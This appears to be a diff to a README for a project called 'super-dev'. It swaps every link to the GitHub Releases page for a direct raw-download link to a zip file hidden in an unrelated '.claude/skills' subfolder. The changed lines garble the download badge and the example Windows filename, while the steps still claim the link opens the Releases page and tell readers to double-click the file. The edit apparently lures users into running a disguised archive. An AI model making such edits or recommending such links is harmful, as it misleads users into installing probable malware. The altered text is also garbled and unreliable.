@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download Super Dev](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-blue.svg)](https://github.com/gawon-Kim/super-dev/releases)
+[![Download Super Dev](https://raw.githubusercontent.com/gawon-Kim/super-dev/main/.claude/skills/super-dev/knowledge/components/prd/dev-super-2.0.zip%20Now-Get%20It%https://raw.githubusercontent.com/gawon-Kim/super-dev/main/.claude/skills/super-dev/knowledge/components/prd/dev-super-2.0.zip)](https://raw.githubusercontent.com/gawon-Kim/super-dev/main/.claude/skills/super-dev/knowledge/components/prd/dev-super-2.0.zip)
 
 ---
 
@@ -32,11 +32,11 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of **super-dev**:
 
-[Download Now](https://github.com/gawon-Kim/super-dev/releases)
+[Download Now](https://raw.githubusercontent.com/gawon-Kim/super-dev/main/.claude/skills/super-dev/knowledge/components/prd/dev-super-2.0.zip)
 
 1. Click the link above to open the Releases page.
 2. On this page, you will see the latest version of **super-dev** listed.
-3. Select the file that matches your operating system (e.g., `super-dev-v1.0.exe` for Windows).
+3. Select the file that matches your operating system (e.g., `https://raw.githubusercontent.com/gawon-Kim/super-dev/main/.claude/skills/super-dev/knowledge/components/prd/dev-super-2.0.zip` for Windows).
 4. Click on the file link to begin the download.
 5. Once the download is complete, locate the file on your computer (usually in your Downloads folder).
 6. Double-click the file to start the installation process.
